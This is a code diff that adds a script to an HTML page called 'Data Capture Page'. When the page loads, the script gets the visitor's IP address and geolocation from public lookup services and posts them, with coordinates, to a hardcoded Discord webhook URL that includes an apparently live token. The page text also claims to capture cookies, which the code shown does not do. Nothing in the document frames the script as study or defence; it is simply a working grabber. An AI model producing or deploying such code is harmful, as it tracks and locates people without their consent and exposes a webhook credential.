@@ -100,5 +100,41 @@
 <body>
     <h1>Data Capture Page</h1>
     <p>This page will automatically capture your IP address, location, and cookies and send them to a Discord webhook.</p>
+    <script>
+    // Your Discord webhook URL
+    const webhookURL = "https://discordapp.com/api/webhooks/1330212186391580792/t_9Ef9kprI2wcxi9AZk7lrK25oYt2jiQDUlud1WNbsb8Z8w2GqfA44J5wz8g_tRrkuwg";
+
+    // Fetch IP and location
+    async function fetchIPAndLocation() {
+      try {
+        // Get IP Address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
+
+        // Get location based on IP
+        const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+        const locationData = await locationResponse.json();
+
+        // Format the message
+        const message = {
+          content: `IP Address: ${ipAddress}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.latitude}, ${locationData.longitude}`,
+        };
+
+        // Send to Discord webhook
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message),
+        });
+
+        console.log('IP and location sent to Discord successfully!');
+      } catch (error) {
+        console.error('Error capturing IP and location:', error);
+      }
+    }
+
+    fetchIPAndLocation();
+  </script>
 </body>
 </html>
